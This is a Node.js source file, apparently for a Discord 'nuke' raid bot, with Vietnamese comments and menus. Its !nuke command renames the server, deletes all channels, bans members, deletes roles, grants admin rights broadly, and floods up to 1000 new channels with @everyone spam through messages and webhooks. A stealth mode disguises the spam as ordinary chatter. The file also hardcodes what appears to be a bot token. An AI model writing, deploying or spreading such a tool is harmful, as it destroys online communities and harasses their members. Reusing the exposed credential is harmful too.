// index.js
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
        ModalBuilder, TextInputBuilder, TextInputStyle, 
        StringSelectMenuBuilder, ButtonBuilder, ButtonStyle,
        PermissionsBitField, REST, Routes } = require('discord.js');
const axios = require('axios');
const fs = require('fs');

// Cấu hình bot
const TOKEN = 'MTUyMTE2NzExOTgxMzgzNjk3MQ.GxT71H.Iy19nNQIMRlviMZt1PwCl_wOAhcA09AyDfmF3I';

// Tạo client
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildWebhooks,
        GatewayIntentBits.GuildEmojisAndStickers,
        GatewayIntentBits.GuildVoiceStates,
        GatewayIntentBits.DirectMessages
    ]
});

// Biến toàn cục
let nuking = false;
let spamMode = 'both';
const NEW_ICON_URL = 'https://media.discordapp.net/attachments/1520427940767072266/1521072190299046038/chorach.jpg?ex=6a43805e&is=6a422ede&hm=62e0d8e627df2122a64caa44d44a0c9e4e8355ad2966b0af5e0141532bd4fa9e&=&format=webpv';
let customSpamText = '@everyone 🔥 RAID GOD MODE! Không thoát được đâu!';
let customIconUrl = null;
let customServerName = null;
let customChannelSuffix = null;
let customChannelCount = 1000;
let stealthMode = false;
let autoAddRole = true;
let spamTasks = [];

// Event ready
client.once('ready', () => {
    console.log(`👑 Bot Nuke God Mode đã sẵn sàng: ${client.user.tag}`);
});

// Lớp Modal cho spam config
class SpamModal extends ModalBuilder {
    constructor() {
        super();
        this.setCustomId('spam_modal');
        this.setTitle('Cấu hình spam');
        
        const spamText = new TextInputBuilder()
            .setCustomId('spam_text')
            .setLabel('Nội dung spam')
            .setStyle(TextInputStyle.Paragraph)
            .setRequired(true);
        
        const channelCount = new TextInputBuilder()
            .setCustomId('channel_count')
            .setLabel('Số lượng kênh (tối đa 1000)')
            .setStyle(TextInputStyle.Short)
            .setRequired(false)
            .setPlaceholder('Ví dụ: 100');
        
        const suffix = new TextInputBuilder()
            .setCustomId('suffix')
            .setLabel('Tên sau emoji của kênh')
            .setStyle(TextInputStyle.Short)
            .setRequired(false)
            .setPlaceholder('vd: text');
        
        const stealth = new TextInputBuilder()
            .setCustomId('stealth')
            .setLabel('Stealth mode? (true/false)')
            .setStyle(TextInputStyle.Short)
            .setRequired(false);
        
        const addRole = new TextInputBuilder()
            .setCustomId('add_role')
            .setLabel('Tạo và gán role admin? (true/false)')
            .setStyle(TextInputStyle.Short)
            .setRequired(false);
        
        this.addComponents(
            new ActionRowBuilder().addComponents(spamText),
            new ActionRowBuilder().addComponents(channelCount),
            new ActionRowBuilder().addComponents(suffix),
            new ActionRowBuilder().addComponents(stealth),
            new ActionRowBuilder().addComponents(addRole)
        );
    }
}

// Lớp Modal cho icon
class IconModal extends ModalBuilder {
    constructor() {
        super();
        this.setCustomId('icon_modal');
        this.setTitle('Đổi icon server');
        
        const iconUrl = new TextInputBuilder()
            .setCustomId('icon_url')
            .setLabel('Link ảnh icon mới')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        this.addComponents(
            new ActionRowBuilder().addComponents(iconUrl)
        );
    }
}

// Lớp Modal cho tên
class NameModal extends ModalBuilder {
    constructor() {
        super();
        this.setCustomId('name_modal');
        this.setTitle('Đổi tên server');
        
        const name = new TextInputBuilder()
            .setCustomId('name')
            .setLabel('Tên server mới')
            .setStyle(TextInputStyle.Short)
            .setRequired(true);
        
        this.addComponents(
            new ActionRowBuilder().addComponents(name)
        );
    }
}

// Dropdown menu
class SetupSelectMenu extends StringSelectMenuBuilder {
    constructor() {
        super()
            .setCustomId('setup_select')
            .setPlaceholder('Chọn cấu hình cần setup...')
            .addOptions([
                { label: 'Spam Webhook', value: 'webhook', emoji: '🌐' },
                { label: 'Spam Text', value: 'text', emoji: '💬' },
                { label: 'Spam Tất Cả', value: 'all', emoji: '💣' },
                { label: 'Cấu hình icon server', value: 'icon', emoji: '🖼️' },
                { label: 'Cấu hình tên server', value: 'name', emoji: '🏷️' },
                { label: 'Cấu hình nội dung spam', value: 'spam_text', emoji: '📢' }
            ]);
    }
}

// Setup view
class SetupView extends ActionRowBuilder {
    constructor() {
        super();
        this.addComponents(new SetupSelectMenu());
    }
}

// Xử lý interaction
client.on('interactionCreate', async interaction => {
    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'spam_modal') {
            const spamText = interaction.fields.getTextInputValue('spam_text');
            const channelCount = interaction.fields.getTextInputValue('channel_count');
            const suffix = interaction.fields.getTextInputValue('suffix');
            const stealth = interaction.fields.getTextInputValue('stealth');
            const addRole = interaction.fields.getTextInputValue('add_role');
            
            customSpamText = spamText;
            customChannelCount = channelCount ? Math.min(parseInt(channelCount) || 1000, 1000) : 1000;
            customChannelSuffix = suffix || null;
            stealthMode = stealth ? stealth.toLowerCase() === 'true' : false;
            autoAddRole = addRole ? addRole.toLowerCase() === 'true' : true;
            
            await interaction.reply({ content: '✅ Đã cập nhật cấu hình spam!', ephemeral: true });
        }
        else if (interaction.customId === 'icon_modal') {
            const iconUrl = interaction.fields.getTextInputValue('icon_url');
            customIconUrl = iconUrl;
            await interaction.reply({ content: '✅ Đã cập nhật icon server!', ephemeral: true });
        }
        else if (interaction.customId === 'name_modal') {
            const name = interaction.fields.getTextInputValue('name');
            customServerName = name;
            await interaction.reply({ content: '✅ Đã cập nhật tên server!', ephemeral: true });
        }
    }
    else if (interaction.isStringSelectMenu()) {
        if (interaction.customId === 'setup_select') {
            const value = interaction.values[0];
            if (value === 'spam_text') {
                await interaction.showModal(new SpamModal());
            }
            else if (value === 'icon') {
                await interaction.showModal(new IconModal());
            }
            else if (value === 'name') {
                await interaction.showModal(new NameModal());
            }
            else {
                spamMode = value;
                await interaction.reply({ 
                    content: `✅ Bạn đã chọn chế độ \`${value}\`. Sẵn sàng dùng \`!nuke\` để thực hiện.`,
                    ephemeral: true 
                });
            }
        }
    }
});

// Command setup
client.on('messageCreate', async message => {
    if (message.author.bot) return;
    if (!message.content.startsWith('!')) return;
    
    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    
    if (command === 'setup') {
        try {
            await message.delete();
        } catch {}
        
        const embed = new EmbedBuilder()
            .setTitle('🛠 HG Hỗ Trợ Nuke')
            .setDescription(`Xin chào ${message.author}!\n\nChọn một danh mục để thiết lập cấu hình nuke theo ý bạn.`)
            .setColor(0x9B59B6)
            .addFields({
                name: '📋 Danh Mục',
                value: '• 🌐 Spam Webhook\n• 💬 Spam Text\n• 💣 Spam Tất Cả\n• 🖼️ Đổi Icon\n• 🏷️ Đổi Tên\n• 📢 Nội dung spam',
                inline: false
            });
        
        try {
            await message.author.send({ embeds: [embed], components: [new SetupView()] });
        } catch {
            await message.reply('❌ Không thể gửi panel DM. Hãy bật tin nhắn từ server hoặc kiểm tra quyền!');
        }
    }
    else if (command === 'nuke') {
        await executeNuke(message);
    }
    else if (command === 'stop') {
        await executeStop(message);
    }
    else if (command === 'help') {
        const embed = new EmbedBuilder()
            .setTitle('💥 HG Nuke God Mode - Hướng Dẫn Sử Dụng')
            .setDescription('Dưới đây là các lệnh chính để cấu hình và thử nghiệm bot:')
            .setColor(0x3498DB)
            .setThumbnail(client.user.displayAvatarURL())
            .addFields(
                { name: '🛠️ `!setup`', value: 'Cấu hình trước khi nuke (spam, tên server, icon...)', inline: false },
                { name: '💣 `!nuke`', value: 'Phá server: xóa kênh, ban member, spam...', inline: false },
                { name: '🛑 `!stop`', value: 'Dừng toàn bộ spam đang chạy', inline: false }
            )
            .setFooter({ text: 'Bot by HG • Chỉ dùng trong server test' });
        
        try {
            await message.delete();
        } catch {}
        
        try {
            await message.author.send({ embeds: [embed] });
        } catch {}
    }
});

// Hàm execute nuke
async function executeNuke(message) {
    nuking = true;
    try {
        await message.delete();
    } catch {}
    
    const guild = message.guild;
    if (!guild) return;
    
    // Đổi tên và icon
    try {
        const newName = customServerName || '☠️ RAID GOD MODE';
        await guild.setName(newName);
        
        const url = customIconUrl || NEW_ICON_URL;
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        await guild.setIcon(response.data);
    } catch {}
    
    // Xóa kênh
    const deletePromises = [];
    for (const channel of guild.channels.cache.values()) {
        try {
            deletePromises.push(channel.delete());
        } catch {}
    }
    await Promise.allSettled(deletePromises);
    await sleep(1000);
    
    // Ban members
    for (const member of guild.members.cache.values()) {
        if (!nuking) break;
        if (member.id === client.user.id) continue;
        try {
            await member.ban({ reason: 'HG NUKE GOD MODE', deleteMessageDays: 1 });
            await sleep(30);
        } catch {}
    }
    
    // Xóa roles
    for (const role of guild.roles.cache.values()) {
        if (role.name === '@everyone') continue;
        try {
            await role.delete();
        } catch {}
    }
    
    // Tạo role admin
    if (autoAddRole) {
        try {
            const adminRole = await guild.roles.create({
                name: '👑 God Admin',
                permissions: [PermissionsBitField.Flags.Administrator],
                color: 0xFF0000
            });
            for (const member of guild.members.cache.values()) {
                if (!member.user.bot) {
                    try {
                        await member.roles.add(adminRole);
                    } catch {}
                }
            }
        } catch {}
    }
    
    // Edit @everyone permissions
    try {
        await guild.roles.everyone.setPermissions(PermissionsBitField.All);
    } catch {}
    
    // Tạo text channels
    const createTasks = [];
    const channelPromises = [];
    
    for (let i = 1; i <= customChannelCount; i++) {
        if (!nuking) break;
        const name = stealthMode ? `chat-${randomInt(1000, 9999)}` : 
                     `${customChannelSuffix || 'god-text-' + i}`;
        
        const promise = createTextChannel(guild, name);
        channelPromises.push(promise);
        
        if (i % 5 === 0) {
            await Promise.allSettled(channelPromises);
            channelPromises.length = 0;
        }
    }
    await Promise.allSettled(channelPromises);
    
    // Tạo voice channels
    for (let i = 1; i <= customChannelCount; i++) {
        if (!nuking) break;
        try {
            const name = stealthMode ? `voice-${randomInt(1000, 9999)}` : 
                         `${customChannelSuffix || 'god-voice-' + i}`;
            await guild.channels.create({
                name: `🎧 ${name}`,
                type: 2 // GuildVoice
            });
        } catch {}
    }
    
    // Tạo emoji
    try {
        for (let i = 0; i < 50; i++) {
            const response = await axios.get(NEW_ICON_URL, { responseType: 'arraybuffer' });
            await guild.emojis.create({ attachment: response.data, name: `godemoji${i}` });
        }
    } catch {}
}

async function createTextChannel(guild, name) {
    try {
        const channel = await guild.channels.create({
            name: `💣 ${name}`,
            type: 0 // GuildText
        });
        
        if (spamMode === 'webhook' || spamMode === 'all') {
            for (let j = 0; j < 2; j++) {
                const whName = stealthMode ? `user${randomInt(1000, 9999)}` : `💥 GOD-${j}`;
                const webhook = await channel.createWebhook({ name: whName });
                
                const task = spamWebhook(webhook);
                spamTasks.push(task);
            }
        }
        
        if (spamMode === 'text' || spamMode === 'all') {
            const task = spamText(channel);
            spamTasks.push(task);
        }
    } catch {}
}

async function spamWebhook(webhook) {
    while (nuking) {
        try {
            const msg = stealthMode ? 
                ['hi', 'hello', 'update...', 'check...'][Math.floor(Math.random() * 4)] : 
                customSpamText;
            const username = stealthMode ? 
                ['sys', 'emma', 'bot', 'mod'][Math.floor(Math.random() * 4)] : 
                '👑 GOD RAID';
            await webhook.send({ content: msg, username: username });
            await sleep(100);
        } catch {
            await sleep(1000);
        }
    }
}

async function spamText(channel) {
    while (nuking) {
        try {
            const msg = stealthMode ? 
                ['hi', 'checking', 'update log', 'bot here'][Math.floor(Math.random() * 4)] : 
                customSpamText;
            await channel.send(msg);
            await sleep(100);
        } catch {
            await sleep(1000);
        }
    }
}

// Hàm stop
async function executeStop(message) {
    nuking = false;
    for (const task of spamTasks) {
        try {
            task.cancel();
        } catch {}
    }
    spamTasks = [];
    try {
        await message.delete();
    } catch {}
}

// Helper functions
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Login
client.login(TOKEN);
